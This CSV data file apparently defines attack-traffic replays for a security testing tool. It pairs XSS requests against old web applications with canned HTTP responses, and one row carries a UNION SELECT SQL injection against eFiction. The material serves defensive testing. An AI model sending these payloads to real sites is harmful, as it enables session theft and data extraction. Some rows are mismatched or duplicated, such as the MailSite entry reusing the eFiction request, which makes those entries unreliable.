XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿drake_cms_xss.xml,Drake CMS UI.DTA.PHP Cross-Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the UI.DTA.PHP function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. Drake CMS is  a web application, and typically listens on port 80.",HTTP,TCP,GET /admin/classes/ui.dta.php?desc[][len]=1&desc[][title]=<script>alert(document.cookie)||3B ||</script>admin/classes/ui.dta.php?desc[][len]=1&desc[][title]=<script>alert(document.cookie)||3B ||</script> HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
drake_cms_xss.xml,Drake CMS UI.DTA.PHP Cross-Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the UI.DTA.PHP function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. Drake CMS is  a web application, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿easy-content_xss.xml,Easy-Content Forums 1.0 XSS Vulnerability,"This threat sends a crafted HTTP Request with with a modified URL string containing HTML or Javascript. Easy-Content Forums is a web application that typically listens on port 80.""",HTTP,TCP,GET /topics.asp?catid=30&forumname=||22 ||><script>alert('X')||3B ||</script>||22 ||><script>alert('X')||3B ||</script> HTTP/1.0||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Host||3A || www.victims.com||0D 0A ||Connection||3A || close||0D 0A 0D 0A||
easy-content_xss.xml,Easy-Content Forums 1.0 XSS Vulnerability,"This threat sends a crafted HTTP Request with with a modified URL string containing HTML or Javascript. Easy-Content Forums is a web application that typically listens on port 80.""",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿efiction_xss_a.xml,eFiction XSS Vulnerabilities,This threat sends a crafted URL that contains Javascript which is included in the returned page. eFiction is an web application that typically listens on port 80.,HTTP,TCP,POST /efiction/titles.php?action=viewlist&let=<script>alert(document.cookie)</script> HTTP/1.0||0D 0A 0D 0A||
efiction_xss_a.xml,eFiction XSS Vulnerabilities,This threat sends a crafted URL that contains Javascript which is included in the returned page. eFiction is an web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿efiction_xss_b.xml,eFiction XSS and SQL Insertion,"This threat sends a crafted URL that contains Javascript which is included in the returned page, as well as an SQL statement that is executed by the server. eFiction is an web application that typically listens on port 80.",HTTP,TCP,"POST /efiction/titles.php?action=viewlist&let='%20UNION%20SELECT%200,0,'<script>alert(document.cookie)</script>',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,penname,0%20FROM%20fanfiction_authors%20/* HTTP/1.0||0D 0A 0D 0A||"
efiction_xss_b.xml,eFiction XSS and SQL Insertion,"This threat sends a crafted URL that contains Javascript which is included in the returned page, as well as an SQL statement that is executed by the server. eFiction is an web application that typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿flexwatch_xss.xml,FlexWATCH Network Camera Cross-Site Scripting Vulnerability,"This threat recreates a cross site scripting condition in FlexWATCH Network Camera. This can allow an attacker to steal session and cookie information.FlexWATCH Network Camera is a web application, and will typically listen on port 80",HTTP,TCP,GET /%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1||0D 0A ||HOST||3A || www.netcamera.com||0D 0A ||User-Agent||3A || Elinks (0.11.1||3B || Linux 2.2 i386||3B ||152x25)||0D 0A ||Referer||3A ||http||3A ||//www.netcamera.com/main.html||0D 0A ||Accept||3A || */*||0D 0A ||Accept-Encoding||3A || gzip||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||
flexwatch_xss.xml,FlexWATCH Network Camera Cross-Site Scripting Vulnerability,"This threat recreates a cross site scripting condition in FlexWATCH Network Camera. This can allow an attacker to steal session and cookie information.FlexWATCH Network Camera is a web application, and will typically listen on port 80",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿fusebox_xss.xml,Fusebox Cross Site Scripting Attack,"This threat recreates a cross site scripting condition in ColdFusion Fusebox.  This can allow an attacker to steal session and cookie information.  Fusebox is a web application, and will typically listen on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿guestbook_xss.xml,Toms Guestebuch 1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,GET /form.php?action=show&homepage=[<script>alert(||22 ||pwnt||22 ||)||3B ||</script>]&mail=[<script>alert(||22 ||pwnt||22 ||)||3B ||</script>]&name=[<script>alert(||22 ||pwnt||22 ||)||3B ||</script>]  HTTP 1.0||0D 0A 0D 0A||
guestbook_xss.xml,Toms Guestebuch 1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿guestbook_xss_b.xml,Toms Guestebuch 1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,GET /admin/header.php?language=[<script>alert(||22 ||pwnt||22 ||)||3B ||</script>]&anzeigebreite=[<script>alert(||22 ||pwnt||22 ||)||3B ||</script>]  HTTP 1.0||0D 0A 0D 0A||
guestbook_xss_b.xml,Toms Guestebuch 1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿guestbook_xss_c.xml,Toms Guestebuch  1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,GET install.php?msg=<script>alert(||22 ||pwnt||22 ||)||3B ||</script>  HTTP 1.0||0D 0A 0D 0A||
guestbook_xss_c.xml,Toms Guestebuch  1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿hivemail_xss.xml,HiveMail XSS Vulnerability,This threat is an example of a cross-site scripting attack where the code is injected via the HiveMail index.php. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,"GET /index.php/%22%3E%3Cscript%3Ealert(document.cookie)||3B ||%3C/script%3E  HTTP/1.0||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A 0D 0A||"
hivemail_xss.xml,HiveMail XSS Vulnerability,This threat is an example of a cross-site scripting attack where the code is injected via the HiveMail index.php. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿host_xss.xml,HTTP Host XSS,"This threat sends a Javascript alert through the Host: field of an HTTP packet.  Some webservers will echo this input back out the web browser, creating the possibility of a cross-site scripting attack.",HTTP,TCP,GET / HTTP/1.1||0D 0A ||Host||3A || <script>alert('1mp3rf3ctr0x')||3B ||</script>||0D 0A 0D 0A||
host_xss.xml,HTTP Host XSS,"This threat sends a Javascript alert through the Host: field of an HTTP packet.  Some webservers will echo this input back out the web browser, creating the possibility of a cross-site scripting attack.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿ideocontent_xss.xml," IdeoContent Manager news_full.php page Variable XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80.,HTTP,TCP,"GET /news_full.php?&page=2||22 ||><script>alert(document.cookie)</script> HTTP/1.0||0D 0A ||User-Agent||3A || Mozilla/5.0 (X11||3B || U||3B || Linux x86_64||3B || en-US||3B || rv||3A ||1.7.12) Gecko/20051020 Epiphany/1.8.2||0D 0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300..Connection||3A || keep-alive..Cache-Control||3A || max-age=0||0D 0A 0D 0A||"
ideocontent_xss.xml," IdeoContent Manager news_full.php page Variable XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿ideocontent_xss_b.xml," IdeoContent Manager Index.php page Variable XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80.,HTTP,TCP,"GET /news_full.php?&page=2||22 ||><script>alert(document.cookie)</script> HTTP/1.0||0D 0A ||User-Agent||3A || Mozilla/5.0 (X11||3B || U||3B || Linux x86_64||3B || en-US||3B || rv||3A ||1.7.12) Gecko/20051020 Epiphany/1.8.2||0D 0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300..Connection||3A || keep-alive..Cache-Control||3A || max-age=0||0D 0A 0D 0A||"
ideocontent_xss_b.xml," IdeoContent Manager Index.php page Variable XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿ie7_jpg_xss.xml,IE7 Malformed Image XSS,This threat causes Internet Explorer 7 and 6 to execute javascript nested inside of a malformed image.  This can allow malicious hackers to poison websites where users are allowed to upload pictures.  This attack would come from a webserver on port 80.,HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
ie7_jpg_xss.xml,IE7 Malformed Image XSS,This threat causes Internet Explorer 7 and 6 to execute javascript nested inside of a malformed image.  This can allow malicious hackers to poison websites where users are allowed to upload pictures.  This attack would come from a webserver on port 80.,HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Thu, 26 Oct 2006 19||3A ||23||3A ||56 GMT||0D 0A ||Server||3A || Apache/1.3.33 (Unix)||0D 0A ||Last-Modified||3A || Wed, 25 Oct 2006 22||3A ||47||3A ||44 GMT||0D 0A ||ETag||3A || ||22 ||33d8284-73-453fe990||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 115||0D 0A ||Content-Type||3A || image/jpeg||0D 0A 0D 0A ||GIF89a||01 00 01 00 ||<HTML><HEAD><SCRIPT>alert('Congrats for using a browser that is proven to suck!')||3B ||</SCRIPT></HEAD></HTML>"
﻿litespeed_xss.xml,LiteSpeed ConfMgr.php Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript to be included  in the returned page. LiteSpeed Webserver is a web application that typically listens on port 80.,HTTP,TCP,GET /admin/config/confMgr.php?m=al_adminListener%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.0||0D 0A 0D 0A||
litespeed_xss.xml,LiteSpeed ConfMgr.php Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript to be included  in the returned page. LiteSpeed Webserver is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿mailsite_xss.xml," Rockliffe MailSite HTTP Management Agent WCONSOLE.DLL XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. Rockliffe Mailsite uses a web based interface that typically listens on port 90.,HTTP,TCP,"POST /efiction/titles.php?action=viewlist&let='%20UNION%20SELECT%200,0,'<script>alert(document.cookie)</script>',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,penname,0%20FROM%20fanfiction_authors%20/* HTTP/1.0||0D 0A 0D 0A||"
mailsite_xss.xml," Rockliffe MailSite HTTP Management Agent WCONSOLE.DLL XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. Rockliffe Mailsite uses a web based interface that typically listens on port 90.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿miniwebshop_xss.xml,Mini Web Shop View.PHP Viewcategory.PHP Cross-Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the View.php function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. Mini Web Shop is a web application, and typically listens on port 80.
",HTTP,TCP,GET /miniwebshop/modules/viewcategory.php?catname='><script>alert(document.cookie)</script> HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
miniwebshop_xss.xml,Mini Web Shop View.PHP Viewcategory.PHP Cross-Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the View.php function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. Mini Web Shop is a web application, and typically listens on port 80.
",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿ned_xss.xml,Nokia Electronic Documentation Cross Site Scripting,This threat attempts to cause a cross site scripting attack on a Nokia Electronic Documentation web server.  Can be used to execute Javascript with the user's permissions on the website they are viewing. ,HTTP,TCP,GET /docs/<script>alert('1mp3rf3ctR0x')||3B ||</script> HTTP/1.0||0D 0A 0D 0A||
